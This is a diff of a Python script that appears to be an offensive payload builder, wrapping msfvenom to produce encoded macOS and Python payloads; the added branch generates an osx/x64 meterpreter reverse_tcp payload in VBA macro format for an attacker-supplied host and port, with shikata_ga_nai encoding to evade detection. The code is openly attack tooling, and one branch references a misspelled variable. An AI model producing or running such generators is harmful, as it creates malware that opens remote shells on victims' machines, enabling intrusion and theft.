@@ -195,6 +195,7 @@ def mac(namder):
         elif namder == 4:
             subprocess.check_output(
                 f'msfvenom -p python/meterpreter/reverse_tcp lhost={host} lport={port} -e x86/shikata_ga_nai -i 5 -f py > {directory}{name}.py', shell=True)
+
     
     elif (namder == 2) or (namder == 5):
         a = 1
@@ -222,6 +223,14 @@ def mac(namder):
 
         subprocess.check_output(
             f'msfvenom -p osx/x86/exec CMD="{cmd}" -e x86/shikata_ga_nai -i 5 -f macho > {directiry}{name}.macho', shell=True)
+    
+    elif namder == 6:
+        a = 1
+        host = str(input('lhost: '))
+        port = int(input('lport: '))
+
+        subprocess.call(
+            f'msfvenom -p osx/x64/meterpreter/reverse_tcp lhost={host} lport={port} -e x86/shikata_ga_nai -i 5 -f vba', shell=True)
     
     else:
         a = 0
